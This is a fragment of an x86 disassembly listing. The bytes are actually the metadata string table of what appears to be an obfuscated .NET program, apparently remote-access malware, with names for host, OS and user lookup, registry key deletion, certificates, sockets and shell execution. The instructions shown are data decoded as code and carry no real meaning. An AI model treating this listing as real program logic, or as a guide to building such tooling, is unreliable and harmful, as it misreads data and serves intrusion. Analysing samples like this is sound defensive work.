  408574:	6d                   	insl   (%dx),%es:(%edi)
  408575:	4d                   	dec    %ebp
  408576:	6f                   	outsl  %ds:(%esi),(%dx)
  408577:	64 65 00 43 6f       	fs add %al,%gs:0x6f(%ebx)
  40857c:	6d                   	insl   (%dx),%es:(%edi)
  40857d:	70 72                	jo     0x4085f1
  40857f:	65 73 73             	gs jae 0x4085f5
  408582:	69 6f 6e 4d 6f 64 65 	imul   $0x65646f4d,0x6e(%edi),%ebp
  408589:	00 43 69             	add    %al,0x69(%ebx)
  40858c:	70 68                	jo     0x4085f6
  40858e:	65 72 4d             	gs jb  0x4085de
  408591:	6f                   	outsl  %ds:(%esi),(%dx)
  408592:	64 65 00 53 65       	fs add %dl,%gs:0x65(%ebx)
  408597:	6c                   	insb   (%dx),%es:(%edi)
  408598:	65 63 74 4d 6f       	arpl   %esi,%gs:0x6f(%ebp,%ecx,2)
  40859d:	64 65 00 44 65 6c    	fs add %al,%gs:0x6c(%ebp,%eiz,2)
  4085a3:	65 74 65             	gs je  0x40860b
  4085a6:	53                   	push   %ebx
  4085a7:	75 62                	jne    0x40860b
  4085a9:	4b                   	dec    %ebx
  4085aa:	65 79 54             	gs jns 0x408601
  4085ad:	72 65                	jb     0x408614
  4085af:	65 00 42 45          	add    %al,%gs:0x45(%edx)
  4085b3:	79 4c                	jns    0x408601
  4085b5:	46                   	inc    %esi
  4085b6:	55                   	push   %ebp
  4085b7:	61                   	popa
  4085b8:	67 7a 71             	addr16 jp 0x40862c
  4085bb:	74 66                	je     0x408623
  4085bd:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  4085c1:	74 5f                	je     0x408622
  4085c3:	4d                   	dec    %ebp
  4085c4:	65 73 73             	gs jae 0x40863a
  4085c7:	61                   	popa
  4085c8:	67 65 00 49 6e       	add    %cl,%gs:0x6e(%bx,%di)
  4085cd:	76 6f                	jbe    0x40863e
  4085cf:	6b 65 00 76          	imul   $0x76,0x0(%ebp),%esp
  4085d3:	6a 6e                	push   $0x6e
  4085d5:	76 68                	jbe    0x40863f
  4085d7:	6c                   	insb   (%dx),%es:(%edi)
  4085d8:	58                   	pop    %eax
  4085d9:	74 6b                	je     0x408646
  4085db:	65 00 49 45          	add    %cl,%gs:0x45(%ecx)
  4085df:	6e                   	outsb  %ds:(%esi),(%dx)
  4085e0:	75 6d                	jne    0x40864f
  4085e2:	65 72 61             	gs jb  0x408646
  4085e5:	62 6c 65 00          	bound  %ebp,0x0(%ebp,%eiz,2)
  4085e9:	49                   	dec    %ecx
  4085ea:	44                   	inc    %esp
  4085eb:	69 73 70 6f 73 61 62 	imul   $0x6261736f,0x70(%ebx),%esi
  4085f2:	6c                   	insb   (%dx),%es:(%edi)
  4085f3:	65 00 54 6f 44       	add    %dl,%gs:0x44(%edi,%ebp,2)
  4085f8:	6f                   	outsl  %ds:(%esi),(%dx)
  4085f9:	75 62                	jne    0x40865d
  4085fb:	6c                   	insb   (%dx),%es:(%edi)
  4085fc:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  408600:	74 5f                	je     0x408661
  408602:	48                   	dec    %eax
  408603:	61                   	popa
  408604:	6e                   	outsb  %ds:(%esi),(%dx)
  408605:	64 6c                	fs insb (%dx),%es:(%edi)
  408607:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  40860b:	6e                   	outsb  %ds:(%esi),(%dx)
  40860c:	74 69                	je     0x408677
  40860e:	6d                   	insl   (%dx),%es:(%edi)
  40860f:	65 46                	gs inc %esi
  408611:	69 65 6c 64 48 61 6e 	imul   $0x6e614864,0x6c(%ebp),%esp
  408618:	64 6c                	fs insb (%dx),%es:(%edi)
  40861a:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  40861e:	74 4d                	je     0x40866d
  408620:	6f                   	outsl  %ds:(%esi),(%dx)
  408621:	64 75 6c             	fs jne 0x408690
  408624:	65 48                	gs dec %eax
  408626:	61                   	popa
  408627:	6e                   	outsb  %ds:(%esi),(%dx)
  408628:	64 6c                	fs insb (%dx),%es:(%edi)
  40862a:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  40862e:	6e                   	outsb  %ds:(%esi),(%dx)
  40862f:	74 69                	je     0x40869a
  408631:	6d                   	insl   (%dx),%es:(%edi)
  408632:	65 54                	gs push %esp
  408634:	79 70                	jns    0x4086a6
  408636:	65 48                	gs dec %eax
  408638:	61                   	popa
  408639:	6e                   	outsb  %ds:(%esi),(%dx)
  40863a:	64 6c                	fs insb (%dx),%es:(%edi)
  40863c:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  408640:	74 54                	je     0x408696
  408642:	79 70                	jns    0x4086b4
  408644:	65 46                	gs inc %esi
  408646:	72 6f                	jb     0x4086b7
  408648:	6d                   	insl   (%dx),%es:(%edi)
  408649:	48                   	dec    %eax
  40864a:	61                   	popa
  40864b:	6e                   	outsb  %ds:(%esi),(%dx)
  40864c:	64 6c                	fs insb (%dx),%es:(%edi)
  40864e:	65 00 57 61          	add    %dl,%gs:0x61(%edi)
  408652:	69 74 48 61 6e 64 6c 	imul   $0x656c646e,0x61(%eax,%ecx,2),%esi
  408659:	65 
  40865a:	00 54 6f 53          	add    %dl,0x53(%edi,%ebp,2)
  40865e:	69 6e 67 6c 65 00 46 	imul   $0x4600656c,0x67(%esi),%ebp
  408665:	69 6c 65 00 49 73 49 	imul   $0x6e497349,0x0(%ebp,%eiz,2),%ebp
  40866c:	6e 
  40866d:	52                   	push   %edx
  40866e:	6f                   	outsl  %ds:(%esi),(%dx)
  40866f:	6c                   	insb   (%dx),%es:(%edi)
  408670:	65 00 57 69          	add    %dl,%gs:0x69(%edi)
  408674:	6e                   	outsb  %ds:(%esi),(%dx)
  408675:	64 6f                	outsl  %fs:(%esi),(%dx)
  408677:	77 73                	ja     0x4086ec
  408679:	42                   	inc    %edx
  40867a:	75 69                	jne    0x4086e5
  40867c:	6c                   	insb   (%dx),%es:(%edi)
  40867d:	74 49                	je     0x4086c8
  40867f:	6e                   	outsb  %ds:(%esi),(%dx)
  408680:	52                   	push   %edx
  408681:	6f                   	outsl  %ds:(%esi),(%dx)
  408682:	6c                   	insb   (%dx),%es:(%edi)
  408683:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  408687:	74 5f                	je     0x4086e8
  408689:	4d                   	dec    %ebp
  40868a:	61                   	popa
  40868b:	69 6e 4d 6f 64 75 6c 	imul   $0x6c75646f,0x4d(%esi),%ebp
  408692:	65 00 50 72          	add    %dl,%gs:0x72(%eax)
  408696:	6f                   	outsl  %ds:(%esi),(%dx)
  408697:	63 65 73             	arpl   %esp,0x73(%ebp)
  40869a:	73 4d                	jae    0x4086e9
  40869c:	6f                   	outsl  %ds:(%esi),(%dx)
  40869d:	64 75 6c             	fs jne 0x40870c
  4086a0:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  4086a4:	74 5f                	je     0x408705
  4086a6:	57                   	push   %edi
  4086a7:	69 6e 64 6f 77 53 74 	imul   $0x7453776f,0x64(%esi),%ebp
  4086ae:	79 6c                	jns    0x40871c
  4086b0:	65 00 50 72          	add    %dl,%gs:0x72(%eax)
  4086b4:	6f                   	outsl  %ds:(%esi),(%dx)
  4086b5:	63 65 73             	arpl   %esp,0x73(%ebp)
  4086b8:	73 57                	jae    0x408711
  4086ba:	69 6e 64 6f 77 53 74 	imul   $0x7453776f,0x64(%esi),%ebp
  4086c1:	79 6c                	jns    0x40872f
  4086c3:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  4086c7:	74 5f                	je     0x408728
  4086c9:	4e                   	dec    %esi
  4086ca:	61                   	popa
  4086cb:	6d                   	insl   (%dx),%es:(%edi)
  4086cc:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  4086d0:	74 5f                	je     0x408731
  4086d2:	46                   	inc    %esi
  4086d3:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  4086da:	00 
  4086db:	73 65                	jae    0x408742
  4086dd:	74 5f                	je     0x40873e
  4086df:	46                   	inc    %esi
  4086e0:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  4086e7:	00 
  4086e8:	47                   	inc    %edi
  4086e9:	65 74 54             	gs je  0x408740
  4086ec:	65 6d                	gs insl (%dx),%es:(%edi)
  4086ee:	70 46                	jo     0x408736
  4086f0:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  4086f7:	00 
  4086f8:	47                   	inc    %edi
  4086f9:	65 74 46             	gs je  0x408742
  4086fc:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  408703:	00 
  408704:	67 65 74 5f          	addr16 gs je 0x408767
  408708:	4d                   	dec    %ebp
  408709:	61                   	popa
  40870a:	63 68 69             	arpl   %ebp,0x69(%eax)
  40870d:	6e                   	outsb  %ds:(%esi),(%dx)
  40870e:	65 4e                	gs dec %esi
  408710:	61                   	popa
  408711:	6d                   	insl   (%dx),%es:(%edi)
  408712:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  408716:	74 5f                	je     0x408777
  408718:	4f                   	dec    %edi
  408719:	53                   	push   %ebx
  40871a:	46                   	inc    %esi
  40871b:	75 6c                	jne    0x408789
  40871d:	6c                   	insb   (%dx),%es:(%edi)
  40871e:	4e                   	dec    %esi
  40871f:	61                   	popa
  408720:	6d                   	insl   (%dx),%es:(%edi)
  408721:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  408725:	74 5f                	je     0x408786
  408727:	46                   	inc    %esi
  408728:	75 6c                	jne    0x408796
  40872a:	6c                   	insb   (%dx),%es:(%edi)
  40872b:	4e                   	dec    %esi
  40872c:	61                   	popa
  40872d:	6d                   	insl   (%dx),%es:(%edi)
  40872e:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  408732:	74 5f                	je     0x408793
  408734:	55                   	push   %ebp
  408735:	73 65                	jae    0x40879c
  408737:	72 4e                	jb     0x408787
  408739:	61                   	popa
  40873a:	6d                   	insl   (%dx),%es:(%edi)
  40873b:	65 00 43 68          	add    %al,%gs:0x68(%ebx)
  40873f:	65 63 6b 48          	arpl   %ebp,%gs:0x48(%ebx)
  408743:	6f                   	outsl  %ds:(%esi),(%dx)
  408744:	73 74                	jae    0x4087ba
  408746:	4e                   	dec    %esi
  408747:	61                   	popa
  408748:	6d                   	insl   (%dx),%es:(%edi)
  408749:	65 00 44 61 74       	add    %al,%gs:0x74(%ecx,%eiz,2)
  40874e:	65 54                	gs push %esp
  408750:	69 6d 65 00 67 65 74 	imul   $0x74656700,0x65(%ebp),%ebp
  408757:	5f                   	pop    %edi
  408758:	4c                   	dec    %esp
  408759:	61                   	popa
  40875a:	73 74                	jae    0x4087d0
  40875c:	57                   	push   %edi
  40875d:	72 69                	jb     0x4087c8
  40875f:	74 65                	je     0x4087c6
  408761:	54                   	push   %esp
  408762:	69 6d 65 00 54 6f 55 	imul   $0x556f5400,0x65(%ebp),%ebp
  408769:	6e                   	outsb  %ds:(%esi),(%dx)
  40876a:	69 76 65 72 73 61 6c 	imul   $0x6c617372,0x65(%esi),%esi
  408771:	54                   	push   %esp
  408772:	69 6d 65 00 57 72 69 	imul   $0x69725700,0x65(%ebp),%ebp
  408779:	74 65                	je     0x4087e0
  40877b:	4c                   	dec    %esp
  40877c:	69 6e 65 00 43 6f 6d 	imul   $0x6d6f4300,0x65(%esi),%ebp
  408783:	62 69 6e             	bound  %ebp,0x6e(%ecx)
  408786:	65 00 55 72          	add    %dl,%gs:0x72(%ebp)
  40878a:	69 48 6f 73 74 4e 61 	imul   $0x614e7473,0x6f(%eax),%ecx
  408791:	6d                   	insl   (%dx),%es:(%edi)
  408792:	65 54                	gs push %esp
  408794:	79 70                	jns    0x408806
  408796:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  40879a:	74 5f                	je     0x4087fb
  40879c:	56                   	push   %esi
  40879d:	61                   	popa
  40879e:	6c                   	insb   (%dx),%es:(%edi)
  40879f:	75 65                	jne    0x408806
  4087a1:	54                   	push   %esp
  4087a2:	79 70                	jns    0x408814
  4087a4:	65 00 50 72          	add    %dl,%gs:0x72(%eax)
  4087a8:	6f                   	outsl  %ds:(%esi),(%dx)
  4087a9:	74 6f                	je     0x40881a
  4087ab:	63 6f 6c             	arpl   %ebp,0x6c(%edi)
  4087ae:	54                   	push   %esp
  4087af:	79 70                	jns    0x408821
  4087b1:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  4087b5:	74 54                	je     0x40880b
  4087b7:	79 70                	jns    0x408829
  4087b9:	65 00 53 6f          	add    %dl,%gs:0x6f(%ebx)
  4087bd:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  4087c0:	74 54                	je     0x408816
  4087c2:	79 70                	jns    0x408834
  4087c4:	65 00 46 69          	add    %al,%gs:0x69(%esi)
  4087c8:	6c                   	insb   (%dx),%es:(%edi)
  4087c9:	65 53                	gs push %ebx
  4087cb:	68 61 72 65 00       	push   $0x657261
  4087d0:	53                   	push   %ebx
  4087d1:	79 73                	jns    0x408846
  4087d3:	74 65                	je     0x40883a
  4087d5:	6d                   	insl   (%dx),%es:(%edi)
  4087d6:	2e 43                	cs inc %ebx
  4087d8:	6f                   	outsl  %ds:(%esi),(%dx)
  4087d9:	72 65                	jb     0x408840
  4087db:	00 43 6c             	add    %al,0x6c(%ebx)
  4087de:	6f                   	outsl  %ds:(%esi),(%dx)
  4087df:	73 65                	jae    0x408846
  4087e1:	00 44 69 73          	add    %al,0x73(%ecx,%ebp,2)
  4087e5:	70 6f                	jo     0x408856
  4087e7:	73 65                	jae    0x40884e
  4087e9:	00 50 61             	add    %dl,0x61(%eax)
  4087ec:	72 73                	jb     0x408861
  4087ee:	65 00 53 74          	add    %dl,%gs:0x74(%ebx)
  4087f2:	72 52                	jb     0x408846
  4087f4:	65 76 65             	gs jbe 0x40885c
  4087f7:	72 73                	jb     0x40886c
  4087f9:	65 00 58 35          	add    %bl,%gs:0x35(%eax)
  4087fd:	30 39                	xor    %bh,(%ecx)
  4087ff:	43                   	inc    %ebx
  408800:	65 72 74             	gs jb  0x408877
  408803:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  40880a:	00 43 72             	add    %al,0x72(%ebx)
  40880d:	65 61                	gs popa
  40880f:	74 65                	je     0x408876
  408811:	00 53 65             	add    %dl,0x65(%ebx)
  408814:	74 54                	je     0x40886a
  408816:	68 72 65 61 64       	push   $0x64616572
  40881b:	45                   	inc    %ebp
  40881c:	78 65                	js     0x408883
  40881e:	63 75 74             	arpl   %esi,0x74(%ebp)
  408821:	69 6f 6e 53 74 61 74 	imul   $0x74617453,0x6e(%edi),%ebp
  408828:	65 00 44 65 6c       	add    %al,%gs:0x6c(%ebp,%eiz,2)
  40882d:	65 74 65             	gs je  0x408895
  408830:	00 43 61             	add    %al,0x61(%ebx)
  408833:	6c                   	insb   (%dx),%es:(%edi)
  408834:	6c                   	insb   (%dx),%es:(%edi)
  408835:	53                   	push   %ebx
  408836:	69 74 65 00 57 72 69 	imul   $0x74697257,0x0(%ebp,%eiz,2),%esi
  40883d:	74 
  40883e:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  408842:	6d                   	insl   (%dx),%es:(%edi)
  408843:	70 69                	jo     0x4088ae
  408845:	6c                   	insb   (%dx),%es:(%edi)
  408846:	65 72 47             	gs jb  0x408890
  408849:	65 6e                	outsb  %gs:(%esi),(%dx)
  40884b:	65 72 61             	gs jb  0x4088af
  40884e:	74 65                	je     0x4088b5
  408850:	64 41                	fs inc %ecx
  408852:	74 74                	je     0x4088c8
  408854:	72 69                	jb     0x4088bf
  408856:	62 75 74             	bound  %esi,0x74(%ebp)
  408859:	65 00 44 65 62       	add    %al,%gs:0x62(%ebp,%eiz,2)
  40885e:	75 67                	jne    0x4088c7
  408860:	67 61                	addr16 popa
  408862:	62 6c 65 41          	bound  %ebp,0x41(%ebp,%eiz,2)
  408866:	74 74                	je     0x4088dc
  408868:	72 69                	jb     0x4088d3
  40886a:	62 75 74             	bound  %esi,0x74(%ebp)
  40886d:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  408871:	6d                   	insl   (%dx),%es:(%edi)
  408872:	56                   	push   %esi
  408873:	69 73 69 62 6c 65 41 	imul   $0x41656c62,0x69(%ebx),%esi
  40887a:	74 74                	je     0x4088f0
  40887c:	72 69                	jb     0x4088e7
  40887e:	62 75 74             	bound  %esi,0x74(%ebp)
  408881:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  408885:	73 65                	jae    0x4088ec
  408887:	6d                   	insl   (%dx),%es:(%edi)
  408888:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
  40888c:	69 74 6c 65 41 74 74 	imul   $0x72747441,0x65(%esp,%ebp,2),%esi
  408893:	72 
  408894:	69 62 75 74 65 00 41 	imul   $0x41006574,0x75(%edx),%esp
  40889b:	73 73                	jae    0x408910
  40889d:	65 6d                	gs insl (%dx),%es:(%edi)
  40889f:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
  4088a3:	72 61                	jb     0x408906
  4088a5:	64 65 6d             	fs gs insl (%dx),%es:(%edi)
  4088a8:	61                   	popa
  4088a9:	72 6b                	jb     0x408916
  4088ab:	41                   	inc    %ecx
  4088ac:	74 74                	je     0x408922
  4088ae:	72 69                	jb     0x408919
  4088b0:	62 75 74             	bound  %esi,0x74(%ebp)
  4088b3:	65 00 54 61 72       	add    %dl,%gs:0x72(%ecx,%eiz,2)
  4088b8:	67 65 74 46          	addr16 gs je 0x408902
  4088bc:	72 61                	jb     0x40891f
  4088be:	6d                   	insl   (%dx),%es:(%edi)
  4088bf:	65 77 6f             	gs ja  0x408931
  4088c2:	72 6b                	jb     0x40892f
  4088c4:	41                   	inc    %ecx
  4088c5:	74 74                	je     0x40893b
  4088c7:	72 69                	jb     0x408932
  4088c9:	62 75 74             	bound  %esi,0x74(%ebp)
  4088cc:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  4088d0:	73 65                	jae    0x408937
  4088d2:	6d                   	insl   (%dx),%es:(%edi)
  4088d3:	62 6c 79 46          	bound  %ebp,0x46(%ecx,%edi,2)
  4088d7:	69 6c 65 56 65 72 73 	imul   $0x69737265,0x56(%ebp,%eiz,2),%ebp
  4088de:	69 
  4088df:	6f                   	outsl  %ds:(%esi),(%dx)
  4088e0:	6e                   	outsb  %ds:(%esi),(%dx)
  4088e1:	41                   	inc    %ecx
  4088e2:	74 74                	je     0x408958
  4088e4:	72 69                	jb     0x40894f
  4088e6:	62 75 74             	bound  %esi,0x74(%ebp)
  4088e9:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  4088ed:	73 65                	jae    0x408954
  4088ef:	6d                   	insl   (%dx),%es:(%edi)
  4088f0:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  4088f4:	6f                   	outsl  %ds:(%esi),(%dx)
  4088f5:	6e                   	outsb  %ds:(%esi),(%dx)
  4088f6:	66 69 67 75 72 61    	imul   $0x6172,0x75(%edi),%sp
  4088fc:	74 69                	je     0x408967
  4088fe:	6f                   	outsl  %ds:(%esi),(%dx)
  4088ff:	6e                   	outsb  %ds:(%esi),(%dx)
  408900:	41                   	inc    %ecx
  408901:	74 74                	je     0x408977
  408903:	72 69                	jb     0x40896e
  408905:	62 75 74             	bound  %esi,0x74(%ebp)
  408908:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  40890c:	73 65                	jae    0x408973
  40890e:	6d                   	insl   (%dx),%es:(%edi)
  40890f:	62 6c 79 44          	bound  %ebp,0x44(%ecx,%edi,2)
  408913:	65 73 63             	gs jae 0x408979
  408916:	72 69                	jb     0x408981
  408918:	70 74                	jo     0x40898e
  40891a:	69 6f 6e 41 74 74 72 	imul   $0x72747441,0x6e(%edi),%ebp
  408921:	69 62 75 74 65 00 44 	imul   $0x44006574,0x75(%edx),%esp
  408928:	65 66 61             	gs popaw
  40892b:	75 6c                	jne    0x408999
  40892d:	74 4d                	je     0x40897c
  40892f:	65 6d                	gs insl (%dx),%es:(%edi)
  408931:	62 65 72             	bound  %esp,0x72(%ebp)
  408934:	41                   	inc    %ecx
  408935:	74 74                	je     0x4089ab
  408937:	72 69                	jb     0x4089a2
  408939:	62 75 74             	bound  %esi,0x74(%ebp)
  40893c:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  408940:	6d                   	insl   (%dx),%es:(%edi)
  408941:	70 69                	jo     0x4089ac
  408943:	6c                   	insb   (%dx),%es:(%edi)
  408944:	61                   	popa
  408945:	74 69                	je     0x4089b0
  408947:	6f                   	outsl  %ds:(%esi),(%dx)
  408948:	6e                   	outsb  %ds:(%esi),(%dx)
  408949:	52                   	push   %edx
  40894a:	65 6c                	gs insb (%dx),%es:(%edi)
  40894c:	61                   	popa
  40894d:	78 61                	js     0x4089b0
  40894f:	74 69                	je     0x4089ba
  408951:	6f                   	outsl  %ds:(%esi),(%dx)
  408952:	6e                   	outsb  %ds:(%esi),(%dx)
  408953:	73 41                	jae    0x408996
  408955:	74 74                	je     0x4089cb
  408957:	72 69                	jb     0x4089c2
  408959:	62 75 74             	bound  %esi,0x74(%ebp)
  40895c:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  408960:	73 65                	jae    0x4089c7
  408962:	6d                   	insl   (%dx),%es:(%edi)
  408963:	62 6c 79 50          	bound  %ebp,0x50(%ecx,%edi,2)
  408967:	72 6f                	jb     0x4089d8
  408969:	64 75 63             	fs jne 0x4089cf
  40896c:	74 41                	je     0x4089af
  40896e:	74 74                	je     0x4089e4
  408970:	72 69                	jb     0x4089db
  408972:	62 75 74             	bound  %esi,0x74(%ebp)
  408975:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  408979:	73 65                	jae    0x4089e0
  40897b:	6d                   	insl   (%dx),%es:(%edi)
  40897c:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  408980:	6f                   	outsl  %ds:(%esi),(%dx)
  408981:	70 79                	jo     0x4089fc
  408983:	72 69                	jb     0x4089ee
  408985:	67 68 74 41 74 74    	addr16 push $0x74744174
  40898b:	72 69                	jb     0x4089f6
  40898d:	62 75 74             	bound  %esi,0x74(%ebp)
  408990:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  408994:	73 65                	jae    0x4089fb
  408996:	6d                   	insl   (%dx),%es:(%edi)
  408997:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  40899b:	6f                   	outsl  %ds:(%esi),(%dx)
  40899c:	6d                   	insl   (%dx),%es:(%edi)
  40899d:	70 61                	jo     0x408a00
  40899f:	6e                   	outsb  %ds:(%esi),(%dx)
  4089a0:	79 41                	jns    0x4089e3
  4089a2:	74 74                	je     0x408a18
  4089a4:	72 69                	jb     0x408a0f
  4089a6:	62 75 74             	bound  %esi,0x74(%ebp)
  4089a9:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  4089ad:	6e                   	outsb  %ds:(%esi),(%dx)
  4089ae:	74 69                	je     0x408a19
  4089b0:	6d                   	insl   (%dx),%es:(%edi)
  4089b1:	65 43                	gs inc %ebx
  4089b3:	6f                   	outsl  %ds:(%esi),(%dx)
  4089b4:	6d                   	insl   (%dx),%es:(%edi)
  4089b5:	70 61                	jo     0x408a18
  4089b7:	74 69                	je     0x408a22
  4089b9:	62 69 6c             	bound  %ebp,0x6c(%ecx)
  4089bc:	69 74 79 41 74 74 72 	imul   $0x69727474,0x41(%ecx,%edi,2),%esi
  4089c3:	69 
  4089c4:	62 75 74             	bound  %esi,0x74(%ebp)
  4089c7:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  4089cb:	74 5f                	je     0x408a2c
  4089cd:	55                   	push   %ebp
  4089ce:	73 65                	jae    0x408a35
  4089d0:	53                   	push   %ebx
  4089d1:	68 65 6c 6c 45       	push   $0x456c6c65
  4089d6:	78 65                	js     0x408a3d
  4089d8:	63 75 74             	arpl   %esi,0x74(%ebp)
  4089db:	65 00 52 65          	add    %dl,%gs:0x65(%edx)
  4089df:	61                   	popa
  4089e0:	64 42                	fs inc %edx
  4089e2:	79 74                	jns    0x408a58
  4089e4:	65 00 57 72          	add    %dl,%gs:0x72(%edi)
  4089e8:	69 74 65 42 79 74 65 	imul   $0x657479,0x42(%ebp,%eiz,2),%esi
  4089ef:	00 
  4089f0:	44                   	inc    %esp
  4089f1:	65 6c                	gs insb (%dx),%es:(%edi)
  4089f3:	65 74 65             	gs je  0x408a5b
  4089f6:	56                   	push   %esi
  4089f7:	61                   	popa
  4089f8:	6c                   	insb   (%dx),%es:(%edi)
  4089f9:	75 65                	jne    0x408a60
  4089fb:	00 47 65             	add    %al,0x65(%edi)
  4089fe:	74 56                	je     0x408a56
  408a00:	61                   	popa
  408a01:	6c                   	insb   (%dx),%es:(%edi)
  408a02:	75 65                	jne    0x408a69
  408a04:	00 53 65             	add    %dl,0x65(%ebx)
  408a07:	74 56                	je     0x408a5f
  408a09:	61                   	popa
  408a0a:	6c                   	insb   (%dx),%es:(%edi)
  408a0b:	75 65                	jne    0x408a72
  408a0d:	00 67 65             	add    %ah,0x65(%edi)
  408a10:	74 5f                	je     0x408a71
  408a12:	4b                   	dec    %ebx
  408a13:	65 65 70 41          	gs gs jo 0x408a58
  408a17:	6c                   	insb   (%dx),%es:(%edi)
  408a18:	69 76 65 00 73 65 74 	imul   $0x74657300,0x65(%esi),%esi
  408a1f:	5f                   	pop    %edi
  408a20:	4b                   	dec    %ebx
  408a21:	65 65 70 41          	gs gs jo 0x408a66
  408a25:	6c                   	insb   (%dx),%es:(%edi)
  408a26:	69 76 65 00 52 65 6d 	imul   $0x6d655200,0x65(%esi),%esi
  408a2d:	6f                   	outsl  %ds:(%esi),(%dx)
  408a2e:	76 65                	jbe    0x408a95
  408a30:	00 73 65             	add    %dh,0x65(%ebx)
  408a33:	74 5f                	je     0x408a94
  408a35:	42                   	inc    %edx
  408a36:	6c                   	insb   (%dx),%es:(%edi)
  408a37:	6f                   	outsl  %ds:(%esi),(%dx)
  408a38:	63 6b 53             	arpl   %ebp,0x53(%ebx)
  408a3b:	69 7a 65 00 67 65 74 	imul   $0x74656700,0x65(%edx),%edi
  408a42:	5f                   	pop    %edi
  408a43:	54                   	push   %esp
  408a44:	6f                   	outsl  %ds:(%esi),(%dx)
  408a45:	74 61                	je     0x408aa8
  408a47:	6c                   	insb   (%dx),%es:(%edi)
  408a48:	53                   	push   %ebx
  408a49:	69 7a 65 00 67 65 74 	imul   $0x74656700,0x65(%edx),%edi
  408a50:	5f                   	pop    %edi
  408a51:	48                   	dec    %eax
  408a52:	65 61                	gs popa
  408a54:	64 65 72 53          	fs gs jb 0x408aab
  408a58:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  408a5f:	5f                   	pop    %edi
  408a60:	48                   	dec    %eax
  408a61:	65 61                	gs popa
  408a63:	64 65 72 53          	fs gs jb 0x408aba
  408a67:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  408a6e:	5f                   	pop    %edi
  408a6f:	53                   	push   %ebx
  408a70:	65 6e                	outsb  %gs:(%esi),(%dx)
  408a72:	64 42                	fs inc %edx
  408a74:	75 66                	jne    0x408adc
  408a76:	66 65 72 53          	data16 gs jb 0x408acd
  408a7a:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  408a81:	5f                   	pop    %edi
  408a82:	52                   	push   %edx
  408a83:	65 63 65 69          	arpl   %esp,%gs:0x69(%ebp)
  408a87:	76 65                	jbe    0x408aee
  408a89:	42                   	inc    %edx
  408a8a:	75 66                	jne    0x408af2
  408a8c:	66 65 72 53          	data16 gs jb 0x408ae3
  408a90:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  408a97:	5f                   	pop    %edi
  408a98:	4b                   	dec    %ebx
  408a99:	65 79 53             	gs jns 0x408aef
  408a9c:	69 7a 65 00 75 74 76 	imul   $0x76747500,0x65(%edx),%edi
  408aa3:	75 57                	jne    0x408afc
  408aa5:	43                   	inc    %ebx
  408aa6:	77 6c                	ja     0x408b14
  408aa8:	7a 79                	jp     0x408b23
  408aaa:	53                   	push   %ebx
  408aab:	4d                   	dec    %ebp
  408aac:	48                   	dec    %eax
  408aad:	66 00 70 79          	data16 add %dh,0x79(%eax)
  408ab1:	77 4b                	ja     0x408afe
  408ab3:	59                   	pop    %ecx
  408ab4:	4e                   	dec    %esi
  408ab5:	71 66                	jno    0x408b1d
  408ab7:	4d                   	dec    %ebp
  408ab8:	48                   	dec    %eax
  408ab9:	66 00 43 47          	data16 add %al,0x47(%ebx)
  408abd:	64 58                	fs pop %eax
  408abf:	46                   	inc    %esi
  408ac0:	53                   	push   %ebx
  408ac1:	79 6e                	jns    0x408b31
  408ac3:	7a 74                	jp     0x408b39
  408ac5:	4d                   	dec    %ebp
  408ac6:	63 48 66             	arpl   %ecx,0x66(%eax)
  408ac9:	00 6e 64             	add    %ch,0x64(%esi)
  408acc:	50                   	push   %eax
  408acd:	68 63 51 75 51       	push   $0x51755163
  408ad2:	63 4e 66             	arpl   %ecx,0x66(%esi)
  408ad5:	00 69 4a             	add    %ch,0x4a(%ecx)
  408ad8:	68 43 79 6f 77       	push   $0x776f7943
  408add:	77 61                	ja     0x408b40
  408adf:	79 73                	jns    0x408b54
  408ae1:	72 64                	jb     0x408b47
  408ae3:	66 00 52 65          	data16 add %dl,0x65(%edx)
  408ae7:	45                   	inc    %ebp
  408ae8:	4c                   	dec    %esp
  408ae9:	6d                   	insl   (%dx),%es:(%edi)
  408aea:	7a 48                	jp     0x408b34
